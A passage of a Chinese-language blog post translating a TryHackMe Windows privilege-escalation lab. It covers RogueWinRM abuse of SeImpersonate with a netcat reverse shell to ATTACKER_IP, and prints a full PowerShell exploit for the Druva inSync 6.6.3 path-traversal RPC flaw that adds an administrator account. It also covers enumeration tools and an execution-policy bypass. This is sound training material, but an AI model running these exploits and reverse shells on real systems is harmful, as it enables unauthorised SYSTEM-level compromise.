+<p>让我们首先假设我们已经入侵了在 IIS 上运行的网站，并且我们已经在以下地址植入了一个 Web Shell：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://MACHINE_IP/</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以使用 Web Shell 检查被入侵账户的分配权限，并确认我们拥有此任务所需的两个权限：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png" alt="Webshell impersonate privileges"></p>
+<p>要使用 RogueWinRM，我们首先需要将漏洞上传到目标机器。为了方便起见，这已经完成了，您可以在 <code>C:\tools\</code> 文件夹中找到漏洞。</p>
+<p>RogueWinRM 漏洞之所以可行，是因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台的端口，可通过网络远程使用。可以将其视为 SSH，但使用 Powershell。</p>
+<p>如果由于某种原因，WinRM 服务未在受害服务器上运行，攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS 服务所做的身份验证尝试。如果攻击者具有 SeImpersonate 权限，他可以代表连接用户（即 SYSTEM）执行任何命令。</p>
+<p>在运行漏洞利用程序之前，我们将启动一个 netcat 监听器来在攻击者的机器上接收反向 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png" alt="RogueWinRM exploit execution"></p>
+<p><strong>注意：</strong>漏洞可能需要长达 2 分钟才能生效，因此您的浏览器可能会暂时无响应。如果您多次运行漏洞，就会发生这种情况，因为它必须等待 BITS 服务停止后才能再次启动。BITS 服务将在启动 2 分钟后自动停止。</p>
+<p><code>-p</code> 参数指定漏洞要运行的可执行文件，在本例中为 <code>nc64.exe</code>。<code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 针对我们的攻击者机器建立反向 shell，因此传递给 netcat 的参数将是 <code>-e cmd.exe ATTACKER_IP 4442</code>。</p>
+<p>如果所有设置均正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br><span class="line">Listening on 0.0.0.0 4442</span><br><span class="line">Connection received on 10.10.175.90 49755</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Abusing-vulnerable-software"><a href="#Abusing-vulnerable-software" class="headerlink" title="Abusing vulnerable software"></a>Abusing vulnerable software</h1><h2 id="Unpatched-Software"><a href="#Unpatched-Software" class="headerlink" title="Unpatched Software"></a>Unpatched Software</h2><p>目标系统上安装的软件可以提供各种特权提升机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用“wmic”工具列出目标系统上安装的软件及其版本。以下命令将转储它可以收集的有关已安装软件的信息（可能需要大约一分钟才能完成）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></tbody></table></figure>
+
+<p>请记住，“wmic product”命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。始终值得检查桌面快捷方式、可用服务或通常任何表明可能存在其他易受攻击的软件的痕迹。</p>
+<p>一旦我们收集了产品版本信息，我们就可以随时在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>、<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a> 或普通的 <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a> 等网站上在线搜索已安装软件的现有漏洞。</p>
+<p>使用 wmic 和 Google，您能找到任何已安装产品上的已知漏洞吗？</p>
+<h2 id="Case-Study-Druva-inSync-6-6-3"><a href="#Case-Study-Druva-inSync-6-6-3" class="headerlink" title="Case Study: Druva inSync 6.6.3"></a>Case Study: Druva inSync 6.6.3</h2><p>目标服务器正在运行 Druva inSync 6.6.3，据 <a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a> 报告，该版本容易受到权限提升的影响。该漏洞是由于一个错误的补丁覆盖了 <a target="_blank" rel="noopener" href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a> 最初报告的另一个漏洞 6.5.0 版本所致。</p>
+<p>该软件之所以容易受到攻击，是因为它以 SYSTEM 权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（在 RPC 术语中称为过程）的机制，以便其他机器可以远程调用它们。</p>
+<p>在 Druva inSync 的案例中，端口 6064 上暴露的程序之一（特别是程序编号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都会以 SYSTEM 权限执行。</p>
+<p>版本 6.5.0 及之前版本上报告的原始漏洞允许无限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。但是，没有进行任何检查以确保这一点。</p>
+<p>他们发布了一个补丁，决定检查执行的命令是否以字符串“C:\ProgramData\Druva\inSync4\”开头，允许的二进制文件应该位于此处。但是，这被证明是不够的，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设您要执行“C:\Windows\System32\cmd.exe”，但它不在允许的路径中；您可以简单地要求服务器运行“C:\ProgramData\Druva\inSync4......\Windows\System32\cmd.exe”，这样就可以成功绕过检查。</p>
+<p>要编写一个有效的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png" alt="Druva Exploit Diagram"></p>
+<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表示我们要执行过程编号 5，因为这是将为我们执行任何命令的易受攻击的过程。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
+<p>最初由 Matteo Malvica 发布 <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">此处</a>，以下漏洞可用于目标计算机以提升权限并检索此任务的标志。为方便起见，以下是原始漏洞的代码：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$ErrorActionPreference</span> = <span class="string">"Stop"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">"net user pwnd /add"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="built_in">New-Object</span> System.Net.Sockets.Socket(</span><br><span class="line">    [<span class="type">System.Net.Sockets.AddressFamily</span>]::InterNetwork,</span><br><span class="line">    [<span class="type">System.Net.Sockets.SocketType</span>]::Stream,</span><br><span class="line">    [<span class="type">System.Net.Sockets.ProtocolType</span>]::Tcp</span><br><span class="line">)</span><br><span class="line"><span class="variable">$s</span>.Connect(<span class="string">"127.0.0.1"</span>, <span class="number">6064</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">"inSync PHC RPCW[v0002]"</span>)</span><br><span class="line"><span class="variable">$rpcType</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">"<span class="variable">$</span>([char]0x0005)`0`0`0"</span>)</span><br><span class="line"><span class="variable">$command</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">"C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <span class="variable">$cmd</span>"</span>);</span><br><span class="line"><span class="variable">$length</span> = [<span class="type">System.BitConverter</span>]::GetBytes(<span class="variable">$command</span>.Length);</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$header</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$rpcType</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$length</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$command</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您可以弹出 Powershell 控制台并直接粘贴漏洞以执行它（该漏洞也可在目标计算机的“C:\tools\Druva_inSync_exploit.txt”中找到）。请注意，漏洞的默认有效负载（在“$cmd”变量中指定）将在系统中创建一个名为“pwnd”的用户，但不会为其分配管理权限，因此我们可能希望将有效负载更改为更有用的东西。对于这个房间，我们将更改有效负载以运行以下命令：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将创建用户“pwnd”，密码为“SimplePass123”，并将其添加到管理员组。如果漏洞利用成功，您应该能够运行以下命令来验证用户“pwnd”是否存在并且属于管理员组：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt; net user pwnd</span><br><span class="line">User name                    pwnd</span><br><span class="line">Full Name</span><br><span class="line">Account active               Yes</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       *Users</span><br><span class="line">Global Group memberships     *None</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后一步，您可以以管理员身份运行命令提示符：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png" alt="Run Command Prompt as Pwnd"></p>
+<h1 id="Tools-of-the-Trade"><a href="#Tools-of-the-Trade" class="headerlink" title="Tools of the Trade"></a>Tools of the Trade</h1><p>有几种脚本可以以与上一个任务中看到的方式类似的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权提升向量。但是，请记住，自动化工具有时会错过特权提升。</p>
+<p>以下是一些常用于识别特权提升向量的工具。请随意对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
+<h2 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h2><p>WinPEAS 是一个脚本，用于枚举目标系统以发现特权升级路径。您可以找到有关 winPEAS 的更多信息，并下载预编译的可执行文件或 .bat 脚本。WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。winPEAS 的输出可能很长，有时难以阅读。这就是为什么始终将输出重定向到文件是个好习惯，如下所示：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; winpeas.exe &gt; outputfile.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>WinPEAS 可以在<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">这里</a>下载。</p>
+<h2 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h2><p>PrivescCheck 是一个 PowerShell 脚本，用于在目标系统上搜索常见的特权升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
+<p>PrivescCheck 可从 <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">此处</a> 下载。</p>
+<p><strong>提醒</strong>：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p>
+<p>Powershell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">PS C:\&gt; . .\PrivescCheck.ps1</span><br><span class="line">PS C:\&gt; Invoke-PrivescCheck</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="WES-NG-Windows-Exploit-Suggester-Next-Generation"><a href="#WES-NG-Windows-Exploit-Suggester-Next-Generation" class="headerlink" title="WES-NG: Windows Exploit Suggester - Next Generation"></a>WES-NG: Windows Exploit Suggester - Next Generation</h2><p>某些漏洞提示脚本（例如 winPEAS）将要求您将其上传到目标系统并在那里运行。这可能会导致防病毒软件检测并删除它们。为了避免制造不必要的噪音以引起注意，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
+<p>WES-NG 是一个 Python 脚本，可以在 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">此处</a> 找到并下载。</p>
+<p>安装后，在使用它之前，请键入 <code>wes.py --update</code> 命令以更新数据库。该脚本将引用它创建的数据库来检查是否存在可能导致漏洞的缺失补丁，您可以使用该漏洞来提升您在目标系统上的权限。</p>
+<p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击机器的 .txt 文件。</p>
+<p>完成后，wes.py 可以按如下方式运行；</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@kali$ wes.py systeminfo.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>如果目标系统上已经有 Meterpreter shell，则可以使用“multi/recon/local_exploit_suggester”模块列出可能影响目标系统的漏洞并允许您提升在目标系统上的权限。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/07/31/THMWindowsPrivilegeEscalation/">http://mikannse.space/2024/07/31/THMWindowsPrivilegeEscalation/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/01/THMWindowsLocalPersistence/" title="THMWindowsLocalPersistence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THMWindowsLocalPersistence</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/28/Javaweb%E4%B9%8BFilter%E4%B8%8EListener/" title="Javaweb之Filter与Listener"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Javaweb之Filter与Listener</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/02/IceTHM/" title="IceTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-02</div><div class="title">IceTHM</div></div></a></div><div><a href="/2024/08/02/THMBypassingUAC/" title="THMBypassingUAC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-02</div><div class="title">THMBypassingUAC</div></div></a></div><div><a href="/2024/04/28/THMPrintNightmare/" title="THMPrintNightmare"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">THMPrintNightmare</div></div></a></div><div><a href="/2023/09/29/THMWindowsPrivEsc%E6%88%BF%E9%97%B4walkthrough/" title="THMWindowsPrivEsc房间walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-29</div><div class="title">THMWindowsPrivEsc房间walkthrough</div></div></a></div><div><a href="/2024/08/01/THMWindowsLocalPersistence/" title="THMWindowsLocalPersistence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">THMWindowsLocalPersistence</div></div></a></div><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Privilege-Escalation"><span class="toc-number">2.</span> <span class="toc-text">Windows Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Users"><span class="toc-number">2.1.</span> <span class="toc-text">Windows Users</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Harvesting-Passwords-from-Usual-Spots"><span class="toc-number">3.</span> <span class="toc-text">Harvesting Passwords from Usual Spots</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%9A%84-Windows-%E5%AE%89%E8%A3%85"><span class="toc-number">3.1.</span> <span class="toc-text">无人值守的 Windows 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-History"><span class="toc-number">3.2.</span> <span class="toc-text">Powershell History</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Saved-Windows-Credentials"><span class="toc-number">3.3.</span> <span class="toc-text">Saved Windows Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-Configuration"><span class="toc-number">3.4.</span> <span class="toc-text">IIS Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retrieve-Credentials-from-Software-PuTTY"><span class="toc-number">3.5.</span> <span class="toc-text">Retrieve Credentials from Software: PuTTY</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other-Quick-Wins"><span class="toc-number">4.</span> <span class="toc-text">Other Quick Wins</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-number">4.2.</span> <span class="toc-text">AlwaysInstallElevated</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-Service-Misconfigurations"><span class="toc-number">5.</span> <span class="toc-text">Abusing Service Misconfigurations</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Services"><span class="toc-number">5.1.</span> <span class="toc-text">Windows Services</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-Permissions-on-Service-Executable"><span class="toc-number">5.2.</span> <span class="toc-text">Insecure Permissions on Service Executable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-number">5.3.</span> <span class="toc-text">Unquoted Service Paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-Service-Permissions"><span class="toc-number">5.4.</span> <span class="toc-text">Insecure Service Permissions</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-dangerous-privileges"><span class="toc-number">6.</span> <span class="toc-text">Abusing dangerous privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Privileges"><span class="toc-number">6.1.</span> <span class="toc-text">Windows Privileges</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeBackup-x2F-SeRestore"><span class="toc-number">6.2.</span> <span class="toc-text">SeBackup &#x2F; SeRestore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeTakeOwnership"><span class="toc-number">6.3.</span> <span class="toc-text">SeTakeOwnership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeImpersonate-x2F-SeAssignPrimaryToken"><span class="toc-number">6.4.</span> <span class="toc-text">SeImpersonate &#x2F; SeAssignPrimaryToken</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-vulnerable-software"><span class="toc-number">7.</span> <span class="toc-text">Abusing vulnerable software</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unpatched-Software"><span class="toc-number">7.1.</span> <span class="toc-text">Unpatched Software</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Case-Study-Druva-inSync-6-6-3"><span class="toc-number">7.2.</span> <span class="toc-text">Case Study: Druva inSync 6.6.3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools-of-the-Trade"><span class="toc-number">8.</span> <span class="toc-text">Tools of the Trade</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WinPEAS"><span class="toc-number">8.1.</span> <span class="toc-text">WinPEAS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivescCheck"><span class="toc-number">8.2.</span> <span class="toc-text">PrivescCheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WES-NG-Windows-Exploit-Suggester-Next-Generation"><span class="toc-number">8.3.</span> <span class="toc-text">WES-NG: Windows Exploit Suggester - Next Generation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">8.4.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/07/31/THMWindowsPrivilegeEscalation/'
+    this.page.identifier = '/2024/07/31/THMWindowsPrivilegeEscalation/'
+    this.page.title = 'THMWindowsPrivilegeEscalation'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
